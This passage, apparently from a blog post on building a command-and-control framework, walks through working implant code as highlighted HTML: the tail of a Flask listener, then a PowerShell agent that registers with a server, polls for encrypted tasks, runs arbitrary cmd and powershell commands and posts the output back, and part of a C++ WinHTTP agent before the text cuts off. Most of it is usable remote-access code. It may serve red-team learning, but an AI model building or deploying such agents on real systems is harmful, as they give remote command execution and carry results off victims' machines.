class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.app.logger.disabled = <span class="literal">True</span></span><br><span class="line">    self.app.run(port=self.port, host=self.ipaddress)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.server = Process(target=self.run)</span><br><span class="line"></span><br><span class="line">    cli = sys.modules[<span class="string">'flask.cli'</span>]</span><br><span class="line">    cli.show_server_banner = <span class="keyword">lambda</span> *x: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    self.daemon = threading.Thread(name = self.name,</span><br><span class="line">                                       target = self.server.start,</span><br><span class="line">                                       args = ())</span><br><span class="line">    self.daemon.daemon = <span class="literal">True</span></span><br><span class="line">    self.daemon.start()</span><br><span class="line"></span><br><span class="line">    self.isRunning = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.server.terminate()</span><br><span class="line">    self.server    = <span class="literal">None</span></span><br><span class="line">    self.daemon    = <span class="literal">None</span></span><br><span class="line">    self.isRunning = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Agents"><a href="#Agents" class="headerlink" title="Agents"></a>Agents</h2><h3 id="Basic-Info-1"><a href="#Basic-Info-1" class="headerlink" title="Basic Info"></a>Basic Info</h3><p>As mentioned earlier, I wrote two agents, one in <code>powershell</code> and the other in <code>c++</code>. Before going through the code of each one, let me talk about what agents do. </p><p>When an agent is executed on a system, first thing it does is get the hostname of that system then send the registration request to the server (<code>/reg</code> as discussed earlier). </p><p>After receiving the response which contains its name it starts an infinite loop in which it keeps checking if there are any new tasks, if there are new tasks it executes them and sends the results back to the server.</p><p>After each loop it sleeps for a specified amount of time that’s controlled by the server, the default sleep time is 3 seconds.</p><p>We can represent that in pseudo code like this:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> hostname</span><br><span class="line">send [hostname, type], <span class="built_in">get</span> name</span><br><span class="line"></span><br><span class="line">loop&#123;</span><br><span class="line"></span><br><span class="line">check <span class="keyword">if</span> there are any <span class="keyword">new</span> tasks</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> new_tasks&#123;</span><br><span class="line">    </span><br><span class="line">            execute tasks</span><br><span class="line">        send results</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">do</span> nothing</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    sleep n </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So far, agents can only do two basic things, execute <code>cmd</code> and <code>powershell</code>.</p><h3 id="PowerShell-Agent"><a href="#PowerShell-Agent" class="headerlink" title="PowerShell Agent"></a>PowerShell Agent</h3><p>I won’t talk about the crypto functions here, I will leave that for the encryption part.</p><p>First 5 lines of the agent are just the basic variables which are the <code>IP</code> address, port, key, name and the time to sleep:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>   = <span class="string">"REPLACE_IP"</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">"REPLACE_PORT"</span></span><br><span class="line"><span class="variable">$key</span>  = <span class="string">"REPLACE_KEY"</span></span><br><span class="line"><span class="variable">$n</span>    = <span class="number">3</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">""</span></span><br></pre></td></tr></table></figure><p>As mentioned earlier, It gets the hostname, sends the registration request and receives its name:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hname</span> = [<span class="type">System.Net.Dns</span>]::GetHostName()</span><br><span class="line"><span class="variable">$type</span>  = <span class="string">"p"</span></span><br><span class="line"><span class="variable">$regl</span>  = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/reg"</span>)</span><br><span class="line"><span class="variable">$data</span>  = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    name = <span class="string">"<span class="variable">$hname</span>"</span> </span><br><span class="line">    type = <span class="string">"<span class="variable">$type</span>"</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$name</span>  = (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$regl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span>).Content</span><br></pre></td></tr></table></figure><p>Based on the received name it creates the variables for the tasks <code>uri</code> and the results <code>uri</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultl</span> = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/results/<span class="variable">$name</span>"</span>)</span><br><span class="line"><span class="variable">$taskl</span>   = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/tasks/<span class="variable">$name</span>"</span>)</span><br></pre></td></tr></table></figure><p>Then it starts the infinite loop:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;)&#123;</span><br><span class="line">...</span><br><span class="line">sleep <span class="variable">$n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s take a look inside the loop, first thing it does is request new tasks, we know that if there are no new tasks the server will respond with a <code>204</code> empty response, so it checks if the response is not null or empty and based on that it decides whether to execute the task execution code block or just sleep again:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$task</span>  = (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$taskl</span> <span class="literal">-Method</span> <span class="string">'GET'</span>).Content</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-Not</span> [<span class="built_in">string</span>]::IsNullOrEmpty(<span class="variable">$task</span>))&#123;</span><br></pre></td></tr></table></figure><p>Inside the task execution code block it takes the encrypted response and decrypts it, splits it then saves the first word in a variable called flag:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$task</span> = Decrypt <span class="variable">$key</span> <span class="variable">$task</span></span><br><span class="line"><span class="variable">$task</span> = <span class="variable">$task</span>.split()</span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$task</span>[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>If the flag was <code>VALID</code> it will continue, otherwise it will sleep again. This ensures that the data has been decrypted correctly.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span> <span class="operator">-eq</span> <span class="string">"VALID"</span>)&#123;</span><br></pre></td></tr></table></figure><p>After ensuring that the data is valid, it takes the command it’s supposed to execute and the arguments:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$task</span>[<span class="number">1</span>]</span><br><span class="line"><span class="variable">$args</span>    = <span class="variable">$task</span>[<span class="number">2</span><span class="type">..</span><span class="variable">$task</span><span class="type">.Length</span>]</span><br></pre></td></tr></table></figure><p>There are 5 valid commands, <code>shell</code>, <code>powershell</code>, <code>rename</code>, <code>sleep</code> and <code>quit</code>.</p><p><code>shell</code> executes <code>cmd</code> commands, <code>powershell</code> executes <code>powershell</code> commands, <code>rename</code> changes the agent’s name, <code>sleep</code> changes the sleep time and <code>quit</code> just exits.</p><p>Let’s take a look at each one of them. The <code>shell</code> and <code>powershell</code> commands basically rely on the same function called <code>shell</code>, so let’s look at that first:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span><span class="params">(<span class="variable">$fname</span>, <span class="variable">$arg</span>)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$pinfo</span>                        = <span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo</span><br><span class="line">    <span class="variable">$pinfo</span>.FileName               = <span class="variable">$fname</span></span><br><span class="line">    <span class="variable">$pinfo</span>.RedirectStandardError  = <span class="variable">$true</span></span><br><span class="line">    <span class="variable">$pinfo</span>.RedirectStandardOutput = <span class="variable">$true</span></span><br><span class="line">    <span class="variable">$pinfo</span>.UseShellExecute        = <span class="variable">$false</span></span><br><span class="line">    <span class="variable">$pinfo</span>.Arguments              = <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$p</span>                            = <span class="built_in">New-Object</span> System.Diagnostics.Process</span><br><span class="line">    <span class="variable">$p</span>.StartInfo                  = <span class="variable">$pinfo</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$p</span>.Start() | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="variable">$p</span>.WaitForExit()</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$p</span>.StandardOutput.ReadToEnd()</span><br><span class="line">    <span class="variable">$stderr</span> = <span class="variable">$p</span>.StandardError.ReadToEnd()</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="string">"VALID <span class="variable">$stdout</span>`n<span class="variable">$stderr</span>"</span></span><br><span class="line">    <span class="variable">$res</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It starts a new process with the given file name whether it was <code>cmd.exe</code> or <code>powershell.exe</code> and passes the given arguments, then it receives <code>stdout</code> and <code>stderr</code> and returns the result which is the <code>VALID</code> flag appended with <code>stdout</code> and <code>stderr</code> separated by a newline.</p><p>Now back to the <code>shell</code> and <code>powershell</code> commands, both of them call <code>shell()</code> with the corresponding file name, receive the output, encrypt it and send it:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"shell"</span>)&#123;</span><br><span class="line">    <span class="variable">$f</span>    = <span class="string">"cmd.exe"</span></span><br><span class="line">    <span class="variable">$arg</span>  = <span class="string">"/c "</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$args</span>)&#123; <span class="variable">$arg</span> += <span class="variable">$a</span> + <span class="string">" "</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span>  = shell <span class="variable">$f</span> <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$res</span>  = Encrypt <span class="variable">$key</span> <span class="variable">$res</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">"<span class="variable">$res</span>"</span>&#125;</span><br><span class="line">                </span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"powershell"</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$f</span>    = <span class="string">"powershell.exe"</span></span><br><span class="line">    <span class="variable">$arg</span>  = <span class="string">"/c "</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$args</span>)&#123; <span class="variable">$arg</span> += <span class="variable">$a</span> + <span class="string">" "</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span>  = shell <span class="variable">$f</span> <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$res</span>  = Encrypt <span class="variable">$key</span> <span class="variable">$res</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">"<span class="variable">$res</span>"</span>&#125;</span><br><span class="line">                </span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>The <code>sleep</code> command updates the <code>n</code> variable then sends an empty result indicating that it completed the task:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"sleep"</span>)&#123;</span><br><span class="line">    <span class="variable">$n</span>    = [<span class="built_in">int</span>]<span class="variable">$args</span>[<span class="number">0</span>]</span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">""</span>&#125;</span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>The <code>rename</code> command updates the <code>name</code> variable and updates the tasks and results <code>uri</code>s, then it sends an empty result indicating that it completed the task:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"rename"</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>    = <span class="variable">$args</span>[<span class="number">0</span>]</span><br><span class="line">    <span class="variable">$resultl</span> = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/results/<span class="variable">$name</span>"</span>)</span><br><span class="line">    <span class="variable">$taskl</span>   = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/tasks/<span class="variable">$name</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$data</span>    = <span class="selector-tag">@</span>&#123;result = <span class="string">""</span>&#125;</span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>The <code>quit</code> command just exits:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"quit"</span>)&#123;</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="C-Agent"><a href="#C-Agent" class="headerlink" title="C++ Agent"></a>C++ Agent</h3><p>The same logic is applied in the c++ agent so I will skip the unnecessary parts and only talk about the <code>http</code> functions and the <code>shell</code> function.</p><p>Sending <code>http</code> requests wasn’t as easy as it was in <code>powershell</code>, I used the <code>winhttp</code> library and with the help of the <a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp" target="_blank" rel="noopener">Microsoft documentation</a> I created two functions, one for sending <code>GET</code> requests and the other for sending <code>POST</code> requests. And they’re almost the same function so I guess I will rewrite them to be one function later.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Get</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> ip, <span class="keyword">unsigned</span> <span class="keyword">int</span> port, <span class="built_in">std</span>::<span class="built_in">string</span> uri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> sip     = get_utf16(ip, CP_UTF8);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> suri    = get_utf16(uri, CP_UTF8);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> response;</span><br><span class="line"></span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line"></span><br><span class="line">    DWORD dwSize       = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    BOOL  bResults     = FALSE;</span><br><span class="line"> </span><br><span class="line">    HINTERNET hSession = <span class="literal">NULL</span>,</span><br><span class="line">              hConnect = <span class="literal">NULL</span>,</span><br><span class="line">              hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"test"</span>,</span><br><span class="line">                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">                           WINHTTP_NO_PROXY_NAME,</span><br><span class="line">                           WINHTTP_NO_PROXY_BYPASS,</span><br><span class="line">                           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSession) &#123;</span><br><span class="line"></span><br><span class="line">        hConnect = WinHttpConnect(hSession,</span><br><span class="line">                                  sip.c_str(),</span><br><span class="line">                                  port,</span><br><span class="line">                                  <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hConnect) &#123;</span><br><span class="line"></span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect,</span><br><span class="line">                                      <span class="string">L"GET"</span>, suri.c_str(),</span><br><span class="line">                                      <span class="literal">NULL</span>,</span><br><span class="line">                                      WINHTTP_NO_REFERER,</span><br><span class="line">                                      WINHTTP_DEFAULT_ACCEPT_TYPES,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">                                      WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      WINHTTP_NO_REQUEST_DATA,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))&#123;&#125;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                    response = response + <span class="built_in">std</span>::<span class="built_in">string</span>(pszOutBuffer);</span><br><span class="line">                    <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Post</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> ip, <span class="keyword">unsigned</span> <span class="keyword">int</span> port, <span class="built_in">std</span>::<span class="built_in">string</span> uri, <span class="built_in">std</span>::<span class="built_in">string</span> dat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPSTR data     = <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span>*&gt;(dat.c_str());;</span><br><span class="line">    DWORD data_len = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">    LPCWSTR additionalHeaders = <span class="string">L"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">    DWORD headersLength       = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> sip     = get_utf16(ip, CP_UTF8);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> suri    = get_utf16(uri, CP_UTF8);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> response;</span><br><span class="line"></span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line"></span><br><span class="line">    DWORD dwSize       = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    BOOL  bResults     = FALSE;</span><br><span class="line"> </span><br><span class="line">    HINTERNET hSession = <span class="literal">NULL</span>,</span><br><span class="line">              hConnect = <span 